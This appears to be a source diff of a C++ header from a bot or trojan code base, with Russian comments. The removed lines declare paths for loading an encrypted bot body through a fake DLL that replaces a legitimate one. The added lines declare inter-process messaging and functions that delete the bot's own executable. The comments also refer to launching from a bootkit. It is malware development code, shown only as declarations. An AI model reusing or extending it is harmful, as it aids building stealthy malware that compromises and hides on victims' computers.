@@ -41,6 +41,14 @@
 
 
 
+//--------------------------------------------
+// Тип запущенного процесса
+//--------------------------------------------
+enum TProcessType { ProcessUnknown  = 0,
+					ProcessExplorer = 1,
+					ProcessLoader   = 2,
+					ProcessService  = 3};
+
 
 
 
@@ -104,7 +112,7 @@ namespace BOT
 	//  Initialize - Функция инициализирует глобальные
 	//				 настройки бота
 	//----------------------------------------------------
-    void Initialize();
+    void Initialize(TProcessType ProcessType = ProcessUnknown);
 
 	//инициализирует только систему вызова функций API, нужна для запуска из под буткита
 	//Initialize() не работает при вызове из под буткита, точнее не срабаывает строка Bot = new TBotApplication();, нужно выяснить почему
@@ -186,10 +194,21 @@ namespace BOT
 	//----------------------------------------------------
 	bool IsRunning();
 
-	//глобальные переменные для хранения данных при запуске чере Fake.dll
-	extern char FakeDllPathBot[MAX_PATH]; //путь к шифрованному телу бота (bot.plug)
-	extern char FakeDllPathDll[MAX_PATH]; //путь к самой Fake.dll, ее заменена оригинальная dll
-	extern char FakeDllPathOrigDll[MAX_PATH]; //путь к оригинальной длл
+	//----------------------------------------------------
+	//  SendProcessMessage - Функция отправляет сообщение
+	//  служебному процессу
+	//----------------------------------------------------
+	bool SendProcessMessage(TProcessType Process, const string &Mesage);
+
+
+	//----------------------------------------------------
+	//  Delete - Функция удаляет ехе бота
+	//----------------------------------------------------
+    void Delete();
+
+	//удаляет тело (файл) бота
+	void DeleteBotFile( const char* FileName );
+
 }
 
 //уид бота, инициализируется в функции BOT::Initialize(), также меняется если будет изменен префикс 
